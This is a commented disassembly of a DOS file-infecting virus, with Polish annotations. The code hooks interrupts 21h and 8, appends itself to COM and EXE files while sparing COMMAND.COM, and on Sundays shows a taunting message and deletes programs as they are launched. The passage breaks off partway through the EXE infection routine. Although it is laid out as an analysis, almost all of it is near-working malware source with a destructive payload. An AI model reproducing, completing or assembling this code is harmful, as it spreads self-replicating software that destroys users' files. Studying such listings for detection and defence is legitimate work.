;       COM - na poczatku
;       EXE - na koncu
;       rozpoznaje wg nazwy (co nie COM = EXE)
;-------
;       aktywacja w niedziele roku roznego od 1989
;       procedury niszczacej
;-------
;       doniesienia co 30 minut
;       ale nigdy nie wlaczone
;-------
;       Nie zaraza COMMAND.COM'a
;-------

LF      EQU     0AH
CR      EQU     0DH

;INITIAL VALUES :       CS:IP   0918:00C4
;                       SS:SP   0918:065D

;----------------
; <- tutaj cialo programu
;----------------

S9180   SEGMENT  STACK
        ASSUME DS:S9180, SS:S9180 ,CS:S9180 ,ES:S9180
L9180:  jmp     L0095           ;L9215                          ;9180 E9 92 00

        db      73h,55h         ;'sU'                           ;9183 73 55

        ;<- wzorzec sygnatury zarazenia
L0005   DB      0C8H,0F7h,0E1h,0EEh,0E7h                        ;9185 C8 F7 E1 EE E7

L000A   dw      100h            ;IP nosiciela COM               ;918A 00 01
L000C   dw      1905h           ;CS nosiciela COM               ;918C 05 19

L000E   db      0               ;ptr aktywnosci wirusa          ;918E 00
L000F   dw      0                                               ;918F 00 00
L0011   dw      9374h           ;dlugosc programu oryginalna    ;9191 74 93

L0013   dw      0FEA5h          ;old int 8                      ;9193 A5
L0015   dw      0F000h                                          ;9195 00
L0017   dw      1460h           ;old int 21h                    ;9197 60 14
L0019   dw      025Bh                                           ;9199 5B 02
L001B   dw      0556h           ;old int 24h                    ;919B 56 05
L001D   dw      0BA6h                                           ;919D A6 0B

L001F   dw      32400           ;30 minut zwloki                ;919F 90 7E
        dw      0                                               ;91A1 00 00
        dw      0                                               ;91A3 00 00
        dw      0                                               ;91A5 00 00
        dw      0                                               ;91A7 00 00
        dw      0                                               ;91A9 00 00
        dw      0                                               ;91AB 00 00
        dw      0E800h                                          ;91AD 00 E8
        dw      5F06h                                           ;91AF 06 5F

L0031   dw      0C89h           ;adres bloku wirusa             ;91B1 89 0C
L0033   dw      80h             ;wielkosc bloku wirusa (para)   ;91B3 80 00

        ;<----- Parameter Block
L0035   dw      0               ;Environment                    ;91B5 00 00
        dw      80h             ;<- command line                ;91B7 80 00
L0039   dw      0C89h           ;   Segment                     ;91B9 89 0C
        dw      5Ch             ;<- FCB-1                       ;91BB 5C 00
L003D   dw      0C89h           ;   Segment                     ;91BD 89 0C
        dw      6Ch             ;<- FCB-2                       ;91BF 6C 00
L0041   dw      0C89h           ;   Segment                     ;91C1 89 0C

L0043   dw      0800h           ;SP nosiciela                   ;91C3 00 08
L0045   dw      0A58h           ;rel segment stosu nosiciela    ;91C5 58 0A

L0047   dw      3D73h           ;IP nosiciela                   ;91C7 73 3D
L0049   dw      0               ;CS nosiciela (rel)             ;91C9 00 00

                                ;pierwsze 3 bajty wektora int ff
L004B   dw      0F000h                                          ;91CB 00 F0
L004D   db      46h                                             ;91CD 46

L004E   db      1               ;0=COM, 1=EXE                   ;91CE 01

        ;<- bufor na poczatek zbioru
L004F   db      'MZ'                                            ;91CF 4D 5A
L0051   dw      01E4h                   ;last page bytes        ;91D1 E4 01
L0053   dw      004Dh                   ;file size - pages      ;91D3 4D 00
        dw      0004h                                           ;91D5 04 00
L0057   dw      0020h                   ;header size (para)     ;91D7 20 00
        dw      01C1h                                           ;91D9 C1 01
        dw      0FFFFh                                          ;91DB FF FF
L005D   dw      0918h                   ;SS                     ;91DD 18 09
L005F   dw      065Dh                   ;SP                     ;91DF 5D 06
L0061   dw      1984h                   ;suma kontrolna         ;91E1 84 19
L0063   dw      00C4h                   ;IP                     ;91E3 C4 00
L0065   dw      0918h                   ;CS                     ;91E5 18 09
        dw      001Eh                                           ;91E7 1E 00
        dw      0000h                                           ;91E9 00 00

        ;<- bufor na 5 ostatnich bajtow zbioru
L006B   db      0Ah,0,0FFh,0FFh,0FFh                            ;91EB 0A 00 FF FF FF

L0070   dw      5       ;File handle                            ;91F0 05 00
L0072   dw      20h     ;atrybut zarazanego zbioru              ;91F2 20 00
L0074   dw      1031h                                           ;91F4 31 10
L0076   dw      0A337h                                          ;91F6 37 A3
L0078   dw      200h    ;bytes/sector(page)                     ;91F8 00 02
L007A   dw      10h     ;bytes/paragraph                        ;91FA 10 00
L007C   dw      9380h   ;nowa dlugosc zbioru DWORD              ;91FC 80 93
L007E   dw      0                                               ;91FD 00 00

L0080   dw      41B9h   ;path nazwy programu - offset           ;9200 B9 41
L0082   dw      9B2Ah   ;                    - segment          ;9202 2A 9B

L0084   db      'COMMAND.COM'                                   ;9294 43 4F 4D 4D 41 4E 44 2E 43 4F 4D
L008F   dw      0,0,0                                           ;929F 00 00 00 00 00 00

;================================================
;       <- Start wirusa zbiorow COM
;------------------------------------------------
L0095:  CLD                                                     ;9215 FC
        MOV     AH,0FFH         ;kontrola rezydowania           ;9216 B4 FF
        INT     21H                                             ;9218 CD 21
        CMP     AH,0FFH                                         ;921A 80 FC FF
        JNB     L9234           ;-> nie rezyduje                ;921D 73 15
        CMP     AH,4                                            ;921F 80 FC 04
        JB      L9234           ;-> nie rezyduje                ;9222 72 10
                                ;<- wirus juz rezyduje
        MOV     AH,0DDH         ;uruchom program                ;9224 B4 DD
        MOV     DI,100h         ;miejsce docelowe programu      ;9226 BF 00 01
        MOV     SI,OFFSET L065F                                 ;9229 BE 5F 06
        ADD     SI,DI           ;miejsce aktualne programu      ;922C 03 F7
        MOV     CX,CS:[DI+11H]  ;dlugosc programu oryginalna    ;922E 2E 8B 4D 11
        INT     21H                                             ;9232 CD 21

L9234:  MOV     AX,CS           ;normalizacja segmentu          ;9234 8C C8
        ADD     AX,10h                                          ;9236 05 10 00
        MOV     SS,AX                                           ;9239 8E D0
        MOV     SP,OFFSET L065D                                 ;923B BC 5D 06
        PUSH    AX                      ;segment                ;923E 50
        MOV     AX,OFFSET L00C4         ;=L9244                 ;923F B8 C4 00
        PUSH    AX                      ;offset                 ;9242 50
        RETF                                                    ;9243 CB

;================================================
;       <- Start wirusa zbioru EXE
;------------------------------------------------
L00C4:
L9244:  CLD                                                     ;9244 FC
        PUSH    ES                      ;<- PSP                 ;9245 06
        MOV     CS:L0031,ES                                     ;9246 2E 8C 06 31 00
        MOV     CS:L0039,ES                                     ;924B 2E 8C 06 39 00
        MOV     CS:L003D,ES                                     ;9250 2E 8C 06 3D 00
        MOV     CS:L0041,ES                                     ;9255 2E 8C 06 41 00
        MOV     AX,ES                   ;segment poczatku pgm   ;925A 8C C0
        ADD     AX,10h                                          ;925C 05 10 00
        ADD     CS:L0049,AX             ;relokowanie CS         ;925F 2E 01 06 49 00
        ADD     CS:L0045,AX             ;relokowanie SS         ;9264 2E 01 06 45 00
        MOV     AH,0FFH                 ;czy juz rezyduje ?     ;9269 B4 FF
        INT     21H                                             ;926B CD 21
        CMP     AH,4                                            ;926D 80 FC 04
        JNZ     L9282                   ;-> jeszcze nie         ;9270 75 10

        POP     ES                      ;<- uruchomienie pgm    ;9272 07
        MOV     SS,CS:L0045             ;inicjacja stosu        ;9273 2E 8E 16 45 00
        MOV     SP,CS:L0043                                     ;9278 2E 8B 26 43 00
        JMP     DWORD PTR CS:L0047      ;uruchomienie nosiciela ;927D 2E FF 2E 47 00

        ;<- zarezydowanie
L9282:  XOR     AX,AX                                           ;9282 33 C0
        MOV     ES,AX                                           ;9284 8E C0
        MOV     BX,03FCh                ;int 0ffh               ;9286 BB FC 03
        MOV     AX,ES:[BX]                                      ;9289 26 8B 07
        MOV     CS:L004B,AX                                     ;928C 2E A3 4B 00
        MOV     AL,ES:[BX+2]                                    ;9290 26 8A 47 02
        MOV     CS:L004D,AL                                     ;9294 2E A2 4D 00
        MOV     WORD PTR ES:[BX],0A5F3h ;rep movsw              ;9298 26 C7 07 F3 A5
        MOV     BYTE PTR ES:[BX+2],0CBH ;ret                    ;929D 26 C6 47 02 CB
        POP     AX                                              ;92A2 58
        ADD     AX,10h                                          ;92A3 05 10 00
        MOV     ES,AX                                           ;92A6 8E C0
        PUSH    CS                                              ;92A8 0E
        POP     DS                                              ;92A9 1F
        MOV     CX,OFFSET L065F         ;dl. wir. bez podpisu   ;92AA B9 5F 06
        SHR     CX,1                    ;na slowa               ;92AD D1 E9
        XOR     SI,SI                   ;offset zrodlowy        ;92AF 33 F6
        MOV     DI,SI                   ;offset wynikowy        ;92B1 8B FE
        PUSH    ES                      ;segment przepisanego   ;92B3 06
        MOV     AX,OFFSET L013C         ;offset kontynuacji     ;92B4 B8 3C 01
        PUSH    AX                                              ;92B7 50
        JMP     DWORD PTR L05F6         ;skok w wektor int FF   ;92B8 FF 2E F6 05

        ;<- kontynuacja na nowym miejscu
L013C:  MOV     AX,CS                                           ;92BC 8C C8
        MOV     SS,AX                                           ;92BE 8E D0
        MOV     SP,OFFSET L065D                                 ;92C0 BC 5D 06
        XOR     AX,AX                                           ;92C3 33 C0
        MOV     DS,AX                                           ;92C5 8E D8
        MOV     AX,CS:L004B     ;odtworzenie wektora int ff     ;92C7 2E A1 4B 00
        MOV     [BX],AX                                         ;92CB 89 07
        MOV     AL,CS:L004D                                     ;92CD 2E A0 4D 00
        MOV     [BX+2],AL                                       ;92D1 88 47 02

        MOV     BX,SP           ;sp -> paragraf                 ;92D4 8B DC
        MOV     CL,4                                            ;92D6 B1 04
        SHR     BX,CL                                           ;92D8 D3 EB
        ADD     BX,20h          ;+512                           ;92DA 83 C3 20
        and     bx,0fff0h                                       ;92DD 83 E3 F0
        MOV     CS:L0033,BX     ;paragrafy bloku potrzebne      ;92E0 2E 89 1E 33 00
        MOV     AH,4AH          ;Set Block                      ;92E5 B4 4A
        MOV     ES,CS:L0031     ;segment bloku                  ;92E7 2E 8E 06 31 00
        INT     21H                                             ;92EC CD 21
        MOV     AX,3521h        ;Get int 21h                    ;92EE B8 21 35
        INT     21H                                             ;92F1 CD 21
        MOV     CS:L0017,BX                                     ;92F3 2E 89 1E 17 00
        MOV     CS:L0019,ES                                     ;92F8 2E 8C 06 19 00
        PUSH    CS                                              ;92FD 0E
        POP     DS                                              ;92FE 1F
        MOV     DX,OFFSET L02D2                                 ;92FF BA D2 02
        MOV     AX,2521h        ;Set int 21h                    ;9302 B8 21 25
        INT     21H                                             ;9305 CD 21
        MOV     ES,[L0031]      ;segment wirusa                 ;9307 8E 06 31 00
        MOV     ES,ES:[2Ch]     ;environment                    ;930B 26 8E 06 2C 00
        XOR     DI,DI           ;szukamy nazwy nosiciela        ;9310 33 FF
        MOV     CX,7FFFh                                        ;9312 B9 FF 7F
        XOR     AL,AL                                           ;9315 32 C0
L9317:  REPNZ   SCASB                                           ;9317 F2 AE
        CMP     ES:[DI],AL                                      ;9319 26 38 05
        LOOPNZ  L9317                                           ;931C E0 F9
        MOV     DX,DI           ;pathname offset                ;931E 8B D7
        ADD     DX,3                                            ;9320 83 C2 03

        MOV     AX,4B00h        ;Load & Execute nosiciela       ;9323 B8 00 4B
        PUSH    ES                                              ;9326 06
        POP     DS              ;pathname segment               ;9327 1F
        PUSH    CS                                              ;9328 0E
        POP     ES              ;parameter block                ;9329 07
        MOV     BX,OFFSET L0035 ;parameter block                ;932A BB 35 00
        PUSH    DS                                              ;932D 1E
        PUSH    ES                                              ;932E 06
        PUSH    AX                                              ;932F 50
        PUSH    BX                                              ;9330 53
        PUSH    CX                                              ;9331 51
        PUSH    DX                                              ;9332 52
        MOV     AH,2AH          ;Get Date                       ;9333 B4 2A
        INT     21H                                             ;9335 CD 21
        MOV     BYTE PTR CS:L000E,0     ;ptr aktywnosci wirusa  ;9337 2E C6 06 0E 00 00
        CMP     CX,1989         ;rok                            ;933D 81 F9 C5 07
        JZ      L936F           ;-> tak                         ;9341 74 2C

; Mistake! Range for AL is 0 ..6 !

        CMP     AL,7            ;niedziela ?                    ;9343 3C 07
        JNZ     L9350           ;-> nie                         ;9345 75 09
        INC     BYTE PTR CS:L000E       ;ptr aktywnosci wirusa  ;9347 2E FE 06 0E 00
        JMP     SHORT   L936F                                   ;934C EB 21

        NOP                                                     ;934E 90
        NOP                                                     ;934F 90

        ;<- to nie niedziela i rok nie 1989
L9350:  MOV     AX,3508h        ;Get int 8                      ;9350 B8 08 35
        INT     21H                                             ;9353 CD 21
        MOV     CS:L0013,BX                                     ;9355 2E 89 1E 13 00
        MOV     CS:L0015,ES                                     ;935A 2E 8C 06 15 00
        PUSH    CS                                              ;935F 0E
        POP     DS                                              ;9360 1F
        MOV     WORD PTR L001F,32400    ;30 minut               ;9361 C7 06 1F 00 90 7E
        MOV     AX,2508h        ;Set int 8                      ;9367 B8 08 25
        MOV     DX,OFFSET L0216                                 ;936A BA 16 02
        INT     21H                                             ;936D CD 21
L936F:  POP     DX                                              ;936F 5A
        POP     CX                                              ;9370 59
        POP     BX                                              ;9371 5B
        POP     AX                                              ;9372 58
        POP     ES                                              ;9373 07
        POP     DS                                              ;9374 1F
        PUSHF                                                   ;9375 9C
        CALL    DWORD PTR CS:L0017      ;old int 21h (run)      ;9376 2E FF 1E 17 00
        PUSH    DS                                              ;937B 1E
        POP     ES                                              ;937C 07
        MOV     AH,49H          ;Free allocated memory          ;937D B4 49
        INT     21H                                             ;937F CD 21
        MOV     AH,4DH          ;Get Return code of child proc  ;9381 B4 4D
        INT     21H                                             ;9383 CD 21
        MOV     AH,31H          ;Keep process                   ;9385 B4 31
        MOV     DX,OFFSET L065F ;adres konca                    ;9387 BA 5F 06
        MOV     CL,4            ;na paragrafy                   ;938A B1 04
        SHR     DX,CL                                           ;938C D3 EA
        ADD     DX,10h          ;zaokraglenie                   ;938E 83 C2 10
        INT     21H                                             ;9391 CD 21

;-----------------------------------------------
;       Wlasna obsluga int 24h
;-----------------------------------------------
L0213:  XOR     AX,AX                                           ;9393 33 C0
        IRET                                                    ;9395 CF

;================================================================
;       Nowa obsluga int 8
;----------------------------------------------------------------
L0216:  CMP     BYTE PTR CS:L000E,1     ;ptr aktywnosci wirusa  ;9396 2E 80 3E 0E 00 01
        JNZ     L93CC           ;-> to nie sobota               ;939C 75 2E
        CMP     WORD PTR CS:L001F,0                             ;939E 2E 83 3E 1F 00 00
        JNZ     L93C7           ;-> jeszcze mamy czas           ;93A4 75 21
        PUSH    AX                                              ;93A6 50
        PUSH    BX                                              ;93A7 53
        PUSH    SI                                              ;93A8 56
        MOV     AH,0EH          ;                               ;93A9 B4 0E
        MOV     BL,1FH          ;atrybut                        ;93AB B3 1F
        LEA     SI,L0251        ;'Today is SunDay...'           ;93AD 8D 36 51 02
L93B1:  MOV     AL,CS:[SI]      ;znak                           ;93B1 2E 8A 04
        CMP     AL,'$'          ;koniec ?                       ;93B4 3C 24
        JZ      L93BD           ;-> tak                         ;93B6 74 05
        INT     10H                                             ;93B8 CD 10
        INC     SI                                              ;93BA 46
        JMP     SHORT   L93B1                                   ;93BB EB F4

L93BD:  MOV     WORD PTR CS:L001F,32400 ;reset licznika na 30min;93BD 2E C7 06 1F 00 90 7E
        POP     SI                                              ;93C4 5E
        POP     BX                                              ;93C5 5B
        POP     AX                                              ;93C6 58
L93C7:  DEC     WORD PTR CS:L001F       ;licznik zwloki         ;93C7 2E FF 0E 1F 00
L93CC:  JMP     DWORD PTR CS:L0013      ;oryginal int 8         ;93CC 2E FF 2E 13 00

L0251   DB      'Today is SunDay! Why do you work so hard?',LF,CR
        DB      'All  work and no play make you a dull boy!',LF,CR
        DB      "Come on ! Let's go out and have some fun!$"

;================================================================
;       Nowa obsluga int 21h
;----------------------------------------------------------------
L02D2:  PUSHF                                                   ;9452 9C
        CMP     AH,0FFH         ;czy to pytanie o wirusa ?      ;9453 80 FC FF
        JNZ     L945D           ;-> nie                         ;9456 75 05
        MOV     AX,0400h        ;sygnalizacja obecnosci         ;9458 B8 00 04
        POPF                                                    ;945B 9D
        IRET                                                    ;945C CF

L945D:  CMP     AH,0DDH         ;uruchomienie nosiciela COM ?   ;945D 80 FC DD
        JZ      L9470           ;-> tak                         ;9460 74 0E
        CMP     AX,4B00h        ;Load & Execute ?               ;9462 3D 00 4B
        JNZ     L946A           ;-> nie, przezroczystosc        ;9465 75 03
        JMP     SHORT   L949E   ;-> tak                         ;9467 EB 35

        NOP                                                     ;9469 90

L946A:  POPF                                                    ;946A 9D
        JMP     DWORD PTR CS:L0017      ;old int 21h            ;946B 2E FF 2E 17 00

L9470:  POP     AX              ;<- 0DDh, uruchom nosiciela COM ;9470 58
        POP     AX                                              ;9471 58
        MOV     AX,0100h        ;IP                             ;9472 B8 00 01
        MOV     CS:L000A,AX                                     ;9475 2E A3 0A 00
        POP     AX              ;CS                             ;9479 58
        MOV     CS:L000C,AX                                     ;947A 2E A3 0C 00
        REPZ    MOVSB           ;przeslanie programu na wirusa  ;947E F3 A4
        POPF                                                    ;9480 9D
        MOV     AX,CS:L000F     ;?                              ;9481 2E A1 0F 00
        JMP     DWORD PTR CS:L000A                              ;9485 2E FF 2E 0A 00

        ;<- uruchamianie programu w fazie aktywnosci 
L948A:  XOR     CX,CX                                           ;948A 33 C9
        MOV     AX,4301h        ;Set file attributes            ;948C B8 01 43
        INT     21H                                             ;948F CD 21
        MOV     AH,41H          ;Delete Directory Entry         ;9491 B4 41
        INT     21H                                             ;9493 CD 21
        MOV     AX,4B00h        ;Load & Execute                 ;9495 B8 00 4B
        POPF                                                    ;9498 9D
        JMP     DWORD PTR CS:L0017      ;old int 21h            ;9499 2E FF 2E 17 00

        ;<- uruchamianie programu
L949E:  CMP     BYTE PTR CS:L000E,1     ;ptr aktywnosci wirusa  ;949E 2E 80 3E 0E 00 01
        JZ      L948A                   ;-> aktywny             ;94A4 74 E4
        MOV     WORD PTR CS:L0070,0FFFFh        ;File handle    ;94A6 2E C7 06 70 00 FF FF
        MOV     WORD PTR CS:L008F,0                             ;94AD 2E C7 06 8F 00 00 00
        MOV     CS:L0080,DX             ;path do programu       ;94B4 2E 89 16 80 00
        MOV     CS:L0082,DS                                     ;94B9 2E 8C 1E 82 00
        PUSH    AX                                              ;94BE 50
        PUSH    BX                                              ;94BF 53
        PUSH    CX                                              ;94C0 51
        PUSH    DX                                              ;94C1 52
        PUSH    SI                                              ;94C2 56
        PUSH    DI                                              ;94C3 57
        PUSH    DS                                              ;94C4 1E
        PUSH    ES                                              ;94C5 06
        CLD                                                     ;94C6 FC
        MOV     DI,DX                                           ;94C7 8B FA
        XOR     DL,DL                   ;aktualny drive         ;94C9 32 D2
        CMP     BYTE PTR [DI+1],':'     ;czy path z drive ?     ;94CB 80 7D 01 3A
        JNZ     L94D6                   ;-> nie, aktualny       ;94CF 75 05
        MOV     DL,[DI]                                         ;94D1 8A 15
        AND     DL,1FH                  ;na numer drive         ;94D3 80 E2 1F
L94D6:  MOV     AH,36H          ;Get Disk Free Space            ;94D6 B4 36
        INT     21H                                             ;94D8 CD 21
        CMP     AX,0FFFFh                                       ;94DA 3D FF FF
        JNZ     L94E2           ;-> drive number OK             ;94DD 75 03
L94DF:  JMP     L9768           ;<- drive number invalid        ;94DF E9 86 02

L94E2:  MUL     BX              ;<sec per clus>*<avl clus>      ;94E2 F7 E3
        MUL     CX              ;*<bytes per sec>               ;94E4 F7 E1
        OR      DX,DX                                           ;94E6 0B D2
        JNZ     L94EF           ;-> ponad 64 KB wolne           ;94E8 75 05
        CMP     AX,OFFSET L065F ;=1631=dlugosc wirusa           ;94EA 3D 5F 06
        JB      L94DF                                           ;94ED 72 F0
L94EF:  MOV     DX,CS:L0080     ;path do programu               ;94EF 2E 8B 16 80 00
        PUSH    DS                                              ;94F4 1E
        POP     ES                                              ;94F5 07
        XOR     AL,AL           ;poszukiwanie konca             ;94F6 32 C0
        MOV     CX,41h                                          ;94F8 B9 41 00
        REPNZ   SCASB                                           ;94FB F2 AE
        MOV     SI,CS:L0080     ;zamiana na duze litery         ;94FD 2E 8B 36 80 00
L9502:  MOV     AL,[SI]                                         ;9502 8A 04
        OR      AL,AL                                           ;9504 0A C0
        JZ      L9516                                           ;9506 74 0E
        CMP     AL,61H                  ;'a'                    ;9508 3C 61
        JB      L9513                                           ;950A 72 07
        CMP     AL,7AH                  ;'z'                    ;950C 3C 7A
        JA      L9513                                           ;950E 77 03
        SUB     BYTE PTR [SI],20H       ;' '                    ;9510 80 2C 20
L9513:  INC     SI                                              ;9513 46
        JMP     SHORT   L9502                                   ;9514 EB EC

L9516:  MOV     CX,0Bh          ;czy to command ?               ;9516 B9 0B 00
        SUB     SI,CX                                           ;9519 2B F1
        MOV     DI,OFFSET L0084 ;'command.com'                  ;951B BF 84 00
        PUSH    CS                                              ;951E 0E
        POP     ES                                              ;951F 07
        MOV     CX,0Bh                                          ;9520 B9 0B 00
        REPZ    CMPSB                                           ;9523 F3 A6
        JNZ     L952A           ;-> nie                         ;9525 75 03
        JMP     L9768           ;-> tak, odpuszczamy            ;9527 E9 3E 02

L952A:  MOV     AX,4300h        ;Get File Attributes            ;952A B8 00 43
        INT     21H                                             ;952D CD 21
        JB      L9536                                           ;952F 72 05
        MOV     CS:L0072,CX     ;atrybut zarazanego zbioru      ;9531 2E 89 0E 72 00
L9536:  JB      L955D                                           ;9536 72 25
        XOR     AL,AL           ;znacznik zbioru COM            ;9538 32 C0
        MOV     CS:L004E,AL     ;0=COM, 1=EXE                   ;953A 2E A2 4E 00
        PUSH    DS              ;szukamy konca nazwy            ;953E 1E
        POP     ES                                              ;953F 07
        MOV     DI,DX                                           ;9540 8B FA
        MOV     CX,41h                                          ;9542 B9 41 00
        REPNZ   SCASB                                           ;9545 F2 AE
        CMP     BYTE PTR [DI-2],4DH     ;'M'-ostatnia litera    ;9547 80 7D FE 4D
        JZ      L9558                   ;-> tak, COM            ;954B 74 0B
        CMP     BYTE PTR [DI-2],6DH     ;'m'                    ;954D 80 7D FE 6D
        JZ      L9558                   ;-> tak, com            ;9551 74 05
        INC     BYTE PTR CS:L004E       ;<- EXE                 ;9553 2E FE 06 4E 00
L9558:  MOV     AX,3D00h                ;Open Handle            ;9558 B8 00 3D
        INT     21H                                             ;955B CD 21
L955D:  JB      L95B9                                           ;955D 72 5A
        MOV     CS:L0070,AX             ;File handle            ;955F 2E A3 70 00
        MOV     BX,AX                                           ;9563 8B D8
        MOV     AX,4202h        ;Move file ptr EOF+offs         ;9565 B8 02 42
        MOV     CX,0FFFFh       ;-5 (piec ostatnich bajtow)     ;9568 B9 FF FF
        MOV     DX,0FFFBh                                       ;956B BA FB FF
        INT     21H                                             ;956E CD 21
        JB      L955D                                           ;9570 72 EB
        ADD     AX,5            ;+5 bajtow sygnatury            ;9572 05 05 00
        MOV     CS:L0011,AX     ;dlugosc programu oryginalna    ;9575 2E A3 11 00
        MOV     CX,5            ;dlugosc sygnatury              ;9579 B9 05 00
        MOV     DX,OFFSET L006B ;bufor na sygnature             ;957C BA 6B 00
        MOV     AX,CS                                           ;957F 8C C8
        MOV     DS,AX                                           ;9581 8E D8
        MOV     ES,AX                                           ;9583 8E C0
        MOV     AH,3FH          ;Read Handle                    ;9585 B4 3F
        INT     21H                                             ;9587 CD 21
        MOV     DI,DX           ;przeczytana sygnatura          ;9589 8B FA
        MOV     SI,OFFSET L0005 ;wzorzec sygnatury              ;958B BE 05 00
        REPZ    CMPSB                                           ;958E F3 A6
        JNZ     L9599           ;-> jeszcze nie zarazony        ;9590 75 07
        MOV     AH,3EH          ;Close Handle                   ;9592 B4 3E
        INT     21H                                             ;9594 CD 21
        JMP     L9768                                           ;9596 E9 CF 01

        ;<----- zarazanie zbioru
L9599:  MOV     AX,3524h                ;Get int 24h            ;9599 B8 24 35
        INT     21H                                             ;959C CD 21
        MOV     L001B,BX                                        ;959E 89 1E 1B 00
        MOV     L001D,ES                                        ;95A2 8C 06 1D 00
        MOV     DX,OFFSET L0213         ;L9393                  ;95A6 BA 13 02
        MOV     AX,2524h                ;Set int 24h            ;95A9 B8 24 25
        INT     21H                                             ;95AC CD 21

        LDS     DX,DWORD PTR L0080      ;ptr na path            ;95AE C5 16 80 00
        XOR     CX,CX                                           ;95B2 33 C9
        MOV     AX,4301h                ;Set File attributes    ;95B4 B8 01 43
        INT     21H                                             ;95B7 CD 21
L95B9:  JB      L95F6                                           ;95B9 72 3B
        MOV     BX,CS:L0070             ;File handle            ;95BB 2E 8B 1E 70 00
        MOV     AH,3EH                  ;Close Handle           ;95C0 B4 3E
        INT     21H                                             ;95C2 CD 21
        MOV     WORD PTR CS:L0070,0FFFFh        ;File handle    ;95C4 2E C7 06 70 00 FF FF
        MOV     AX,3D02h                ;Open Handle R/W        ;95CB B8 02 3D
        INT     21H                                             ;95CE CD 21
        JB      L95F6                                           ;95D0 72 24
        MOV     CS:L0070,AX             ;File handle            ;95D2 2E A3 70 00
        MOV     AX,CS                                           ;95D6 8C C8
        MOV     DS,AX                                           ;95D8 8E D8
        MOV     ES,AX                                           ;95DA 8E C0
        MOV     BX,L0070                ;File handle            ;95DC 8B 1E 70 00
        MOV     AX,5700h                ;Get File Date/Time     ;95E0 B8 00 57
        INT     21H                                             ;95E3 CD 21
        MOV     L0074,DX                                        ;95E5 89 16 74 00
        MOV     L0076,CX                                        ;95E9 89 0E 76 00
        MOV     AX,4200h                ;Move file ptr BOF+offs ;95ED B8 00 42
        XOR     CX,CX                                           ;95F0 33 C9
        MOV     DX,CX                                           ;95F2 8B D1
        INT     21H                                             ;95F4 CD 21
L95F6:  JB      L9636                                           ;95F6 72 3E
        CMP     BYTE PTR L004E,0        ;0=COM, 1=EXE           ;95F8 80 3E 4E 00 00
        JZ      L9603                                           ;95FD 74 04
        JMP     SHORT   L965C                                   ;95FF EB 5B

        NOP                                                     ;9601 90
        NOP                                                     ;9602 90

        ;<----- Zarazenie COM'a
L9603:  MOV     BX,1000h        ;zadanie 64KB bufora pamieci    ;9603 BB 00 10
        MOV     AH,48H          ;allocate memory                ;9606 B4 48
        INT     21H                                             ;9608 CD 21
        JNB     L9617           ;-> powiodlo sie                ;960A 73 0B
        MOV     AH,3EH          ;Close Handle                   ;960C B4 3E
        MOV     BX,L0070        ;File handle                    ;960E 8B 1E 70 00
        INT     21H                                             ;9612 CD 21
        JMP     L9768                                           ;9614 E9 51 01

L9617:  INC     WORD PTR L008F                                  ;9617 FF 06 8F 00
        MOV     ES,AX           ;nowy blok pamieci              ;961B 8E C0
        XOR     SI,SI                                           ;961D 33 F6
        MOV     DI,SI                                           ;961F 8B FE
        MOV     CX,OFFSET L065F                                 ;9621 B9 5F 06
        REPZ    MOVSB           ;przepisanie do bufora          ;9624 F3 A4

        MOV     DX,DI           ;pierwsze wolne miejsce         ;9626 8B D7
        MOV     CX,L0011        ;dlugosc programu oryginalna    ;9628 8B 0E 11 00
        MOV     BX,L0070        ;File handle                    ;962C 8B 1E 70 00
        PUSH    ES                                              ;9630 06
        POP     DS                                              ;9631 1F
        MOV     AH,3FH          ;Read Handle                    ;9632 B4 3F
        INT     21H                                             ;9634 CD 21
L9636:  JB      L9657                                           ;9636 72 1F
        ADD     DI,CX           ;na poczatek zbioru             ;9638 03 F9
        XOR     CX,CX                                           ;963A 33 C9
        MOV     DX,CX                                           ;963C 8B D1
        MOV     AX,4200h        ;Move file ptr BOF+offs         ;963E B8 00 42
        INT     21H                                             ;9641 CD 21
        MOV     SI,OFFSET L0005 ;dopisanie ogonka               ;9643 BE 05 00
        MOV     CX,5                                            ;9646 B9 05 00
        PUSH    DS                                              ;9649 1E
        PUSH    CS                                              ;964A 0E
        POP     DS                                              ;964B 1F
        REPZ    MOVSB                                           ;964C F3 A4
        POP     DS                                              ;964E 1F
        MOV     CX,DI           ;nowa dlugosc programu          ;964F 8B CF
        XOR     DX,DX           ;bufor z wynikowym programem    ;9651 33 D2
        MOV     AH,40H          ;Write Handle                   ;9653 B4 40
        INT     21H                                             ;9655 CD 21
L9657:  JB      L9666                                           ;9657 72 0D
        JMP     L9723                                           ;9659 E9 C7 00

        ;<----- Zarazenie EXE'ca
L965C:  MOV     CX,1Ch          ;EXE file header - dlugosc      ;965C B9 1C 00
        MOV     DX,OFFSET L004F ;                - bufor        ;965F BA 4F 00
        MOV     AH,3FH          ;Read Handle                    ;9662 B4 3F
        INT     21H                                             ;9664 CD 21
L9666:  JB      L96B2                                           ;9666 72 4A
        MOV     WORD PTR L0061,1984h    ;suma kontrolna         ;9668 C7 06 61 00 84 19
        MOV     AX,L005D                ;SS                     ;966E A1 5D 00
        MOV     L0045,AX                                        ;9671 A3 45 00
        MOV     AX,L005F                ;SP                     ;9674 A1 5F 00
        MOV     L0043,AX                                        ;9677 A3 43 00
        MOV     AX,L0063                ;IP                     ;967A A1 63 00
        MOV     L0047,AX                                        ;967D A3 47 00
        MOV     AX,L0065                ;CS                     ;9680 A1 65 00
        MOV     L0049,AX                                        ;9683 A3 49 00
        MOV     AX,L0053                ;sile size - pages      ;9686 A1 53 00
        CMP     WORD PTR L0051,0        ;last page bytes        ;9689 83 3E 51 00 00
        JZ      L9691                                           ;968E 74 01
        DEC     AX                                              ;9690 48
L9691:  MUL     WORD PTR L0078          ;* <bytes per page>     ;9691 F7 26 78 00
        ADD     AX,L0051                ;+last page bytes       ;9695 03 06 51 00
        ADC     DX,0                                            ;9699 83 D2 00
        ADD     AX,0Fh                  ;zaokraglenie           ;969C 05 0F 00
        ADC     DX,0                                            ;969F 83 D2 00
        AND     AX,0FFF0h                                       ;96A2 25 F0 FF
        MOV     L007C,AX                                        ;96A5 A3 7C 00
        MOV     L007E,DX                                        ;96A8 89 16 7E 00
        ADD     AX,OFFSET L0664         ;dlugosc z sygnatura    ;96AC 05 64 06
        ADC     DX,0                                            ;96AF 83 D2 00
L96B2:  JB      L96EE                                           ;96B2 72 3A
        DIV     WORD PTR L0078          ;bytes per page         ;96B4 F7 36 78 00
        OR      DX,DX                   ;czy jest reszta ?      ;96B8 0B D2
        JZ      L96BD                   ;-> nie                 ;96BA 74 01
        INC     AX                      ;<- jest reszta         ;96BC 40
L96BD:  MOV     L0053,AX                ;pages per file         ;96BD A3 53 00
